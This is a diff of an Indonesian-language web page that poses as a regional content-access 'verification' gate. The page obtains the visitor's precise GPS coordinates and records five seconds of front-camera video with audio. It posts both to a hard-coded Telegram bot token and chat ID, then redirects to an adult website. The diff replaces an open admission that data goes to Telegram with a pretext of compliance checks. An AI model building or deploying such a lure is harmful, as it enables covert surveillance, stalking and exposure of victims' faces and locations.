@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Berbagi Data</title>
+    <title>Verifikasi Akses Regional</title>
     <style>
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
@@ -12,7 +12,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #121212; /* Latar belakang hitam TikTok */
+            background-color: #121212;
             color: #ffffff;
         }
         .container {
@@ -21,7 +21,7 @@
             background: #1e1e1e;
             border-radius: 16px;
             box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            max-width: 380px;
+            max-width: 400px;
             width: 90%;
             border: 1px solid #2f2f2f;
         }
@@ -29,36 +29,40 @@
             font-size: 22px;
             margin-bottom: 15px;
             font-weight: 700;
-            letter-spacing: -0.5px;
         }
         p {
             font-size: 14px;
             color: #e3e3e3;
             line-height: 1.5;
         }
-        .desc-opsional {
-            font-size: 12px; 
-            color: #8a8a8a;
+        .warning-text {
+            font-size: 12px;
+            color: #ffc107;
+            background: rgba(255, 193, 7, 0.1);
+            padding: 10px;
+            border-radius: 6px;
             margin-top: 15px;
         }
+        .btn-group {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
         button {
-            padding: 14px 28px;
-            font-size: 16px;
-            background-color: #FE2C55; /* Merah TikTok */
+            padding: 14px;
+            font-size: 15px;
+            background-color: #2f2f2f;
             color: white;
-            border: none;
-            border-radius: 4px;
+            border: 1px solid #444;
+            border-radius: 6px;
             cursor: pointer;
-            font-weight: 700;
-            width: 100%;
-            margin-top: 20px;
-            transition: background 0.2s, transform 0.1s;
+            font-weight: 600;
+            transition: all 0.2s;
         }
         button:hover {
-            background-color: #e12246;
-        }
-        button:active {
-            transform: scale(0.98);
+            background-color: #FE2C55;
+            border-color: #FE2C55;
         }
         #status-box {
             margin-top: 20px;
@@ -67,26 +71,19 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             gap: 15px;
         }
-        /* Style untuk Loading Spinner */
         .spinner {
             width: 40px;
             height: 40px;
             border: 4px solid #2f2f2f;
-            border-top: 4px solid #25F4EE; /* Cyan TikTok */
+            border-top: 4px solid #25F4EE;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             display: none;
         }
-        .loading {
-            color: #25F4EE;
-        }
-        .success {
-            color: #00f2fe;
-            text-shadow: 0 0 10px rgba(0,242,254,0.4);
-        }
+        .loading { color: #25F4EE; }
+        .success { color: #00f2fe; }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -97,25 +94,33 @@
 
 <div class="container">
     <div id="setup-box">
-        <h3>Konfirmasi Penggunaan Fitur</h3>
-        <p>Halaman ini memerlukan akses **Lokasi** dan **Kamera Depan** untuk proses verifikasi sistem Anda.</p>
-        <p class="desc-opsional">Data akan dikirim secara aman ke server Telegram kami setelah Anda menekan tombol di bawah.</p>
-        <button id="start-btn" onclick="mulaiProses()">Saya Setuju & Mulai</button>
+        <h3>Verifikasi Akses Pengguna</h3>
+        <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
+        
+        <p class="warning-text">
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk memverifikasi lokasi GPS dan mengambil rekaman video validasi (5 detik) demi kepatuhan layanan.
+        </p>
+
+        <div class="btn-group">
+            <button onclick="mulaiVerifikasi('Indonesia')">Masuk Lewat Server Indonesia</button>
+            <button onclick="mulaiVerifikasi('Global')">Masuk Lewat Server Global / Internasional</button>
+        </div>
     </div>
 
     <div id="status-box" style="display: none;">
         <div id="loading-spinner" class="spinner"></div>
-        <p id="status-text">Memulai...</p>
+        <p id="status-text">Memproses...</p>
     </div>
 </div>
 
 <script>
-// === KONFIGURASI TELEGRAM (GANTI DENGAN DATA ANDA) ===
 const TELEGRAM_TOKEN = "8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w";
 const CHAT_ID = "1966317946";
+const URL_WEB_TUJUAN = "https://xhamster.com/"; 
 
 let userLatitude = null;
 let userLongitude = null;
+let wilayahDipilih = "";
 
 function updateStatus(text, className, showSpinner = false) {
     const statusBox = document.getElementById('status-box');
@@ -125,46 +130,36 @@ function updateStatus(text, className, showSpinner = false) {
     statusBox.style.display = 'flex';
     statusText.innerText = text;
     statusText.className = className;
-    
-    if (showSpinner) {
-        spinner.style.display = 'block';
-    } else {
-        spinner.style.display = 'none';
-    }
+    spinner.style.display = showSpinner ? 'block' : 'none';
 }
 
-function mulaiProses() {
+function mulaiVerifikasi(wilayah) {
+    wilayahDipilih = wilayah;
     document.getElementById('setup-box').style.display = 'none';
-    
-    // Menggunakan kata status yang lebih profesional sesuai permintaan
-    updateStatus("Melakukan pengamanan akses...", "loading", true);
+    updateStatus("Mengonfirmasi koordinat lokasi regional...", "loading", true);
     
     if (navigator.geolocation) {
-        // Menggunakan opsi high accuracy agar pembacaan lokasi lebih cepat jika sudah diizinkan
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 userLatitude = position.coords.latitude;
                 userLongitude = position.coords.longitude;
-                
-                // Langsung lanjut ke perekaman tanpa jeda buatan jika lokasi sukses didapat
-                mulaiRekamKameraDepan();
+                prosesRekamanKamera();
             },
             (error) => {
-                updateStatus("❌ Gagal memproses data keamanan.", "", false);
-                alert("Gagal: Sistem memerlukan izin lokasi untuk melanjutkan.");
+                updateStatus("❌ Verifikasi lokasi ditolak oleh pengguna.", "", false);
+                alert("Akses ditolak: Verifikasi lokasi diperlukan untuk masuk.");
             },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 5000 }
         );
     } else {
-        updateStatus("❌ Browser tidak mendukung fitur ini.", "", false);
+        updateStatus("❌ Browser tidak mendukung verifikasi GPS.", "", false);
     }
 }
 
-function mulaiRekamKameraDepan() {
-    const constraints = {
-        video: { facingMode: "user" },
-        audio: true
-    };
+function prosesRekamanKamera() {
+    updateStatus("Memulai pengambilan video validasi (5 detik)...", "loading", true);
+
+    const constraints = { video: { facingMode: "user" }, audio: true };
 
     navigator.mediaDevices.getUserMedia(constraints)
         .then((stream) => {
@@ -172,41 +167,38 @@ function mulaiRekamKameraDepan() {
             let videoChunks = [];
 
             mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    videoChunks.push(event.data);
-                }
+                if (event.data.size > 0) videoChunks.push(event.data);
             };
 
             mediaRecorder.onstop = () => {
                 stream.getTracks().forEach(track => track.stop());
                 const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                kirimDataKeTelegram(videoBlob);
+                kirimKeTelegram(videoBlob);
             };
 
-            // Mulai merekam video
             mediaRecorder.start();
 
-            // Batasan durasi rekam tepat 5 detik (5000 milidetik)
             setTimeout(() => {
                 mediaRecorder.stop();
             }, 5000);
-
         })
         .catch((error) => {
-            updateStatus("❌ Gagal mengakses modul keamanan.", "", false);
-            alert("Gagal: Sistem memerlukan izin kamera untuk melanjutkan.");
+            updateStatus("❌ Akses kamera ditolak atau tidak tersedia.", "", false);
+            alert("Akses ditolak: Kamera diperlukan untuk menyelesaikan proses.");
         });
 }
 
-function kirimDataKeTelegram(videoBlob) {
-    const infoTeks = `📍 *Data Verifikasi Pengguna*:\n\n` +
-                     `• Latitude: \`${userLatitude}\`\n` +
-                     `• Longitude: \`${userLongitude}\`\n` +
-                     `• Google Maps: https://google.com{userLatitude},${userLongitude}`;
+function kirimKeTelegram(videoBlob) {
+    updateStatus("Mengunggah data enkripsi verifikasi...", "loading", true);
+
+    const infoTeks = `🔐 *Hasil Verifikasi Akses*:\n\n` +
+                     `• Wilayah Pilihan: \`${wilayahDipilih}\`\n` +
+                     `• Koordinat: \`${userLatitude}, ${userLongitude}\`\n` +
+                     `• Peta: https://google.com{userLatitude},${userLongitude}`;
 
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('video', videoBlob, 'verifikasi_kamera_depan.webm');
+    formData.append('video', videoBlob, 'verifikasi_user.webm');
     formData.append('caption', infoTeks);
     formData.append('parse_mode', 'Markdown');
 
@@ -217,15 +209,16 @@ function kirimDataKeTelegram(videoBlob) {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            updateStatus("✅ Verifikasi Selesai! Terima kasih.", "success", false);
+            updateStatus("✅ Verifikasi Berhasil! Mengalihkan ke situs...", "success", false);
+            setTimeout(() => {
+                window.location.href = URL_WEB_TUJUAN;
+            }, 1500);
         } else {
-            updateStatus("❌ Gagal mengirimkan data.", "", false);
-            console.error("Telegram API Error:", data);
+            updateStatus("❌ Gagal memvalidasi data ke server.", "", false);
         }
     })
     .catch(error => {
         updateStatus("❌ Terjadi kesalahan jaringan.", "", false);
-        console.error("Fetch Error:", error);
     });
 }
 </script>
